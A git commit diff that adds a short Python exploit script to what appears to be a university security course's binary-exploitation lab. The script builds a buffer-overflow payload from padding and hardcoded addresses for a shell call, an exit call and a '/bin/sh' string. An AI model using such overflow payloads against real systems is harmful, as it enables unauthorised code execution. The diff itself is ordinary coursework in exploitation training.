6e55653aa7dc31ac371c77cf7ec6b2a1b988e77d
maruki00 <aitbaha48@gmail.com>
2025-08-11 19:44:10 +0100

    commit

--- rpisec/csci4968/lvl1/lab2/exp.py
+++ rpisec/csci4968/lvl1/lab2/exp.py
@@ -1,5 +1,13 @@
 #!/usr/bin/python
 
+import struct
 
 
-print("here we go")
+print("here we go, exploit start.")
+pad = b'A'*27
+ext = struct.pack("I", 0xf7dbad10)
+shell = struct.pack("I", 0x80486bd)
+#binsh = struct.pack("I", 0x804a028)
+binsh = struct.pack("I", 0x080487d0)
+
+print(pad+shell+ext+binsh)
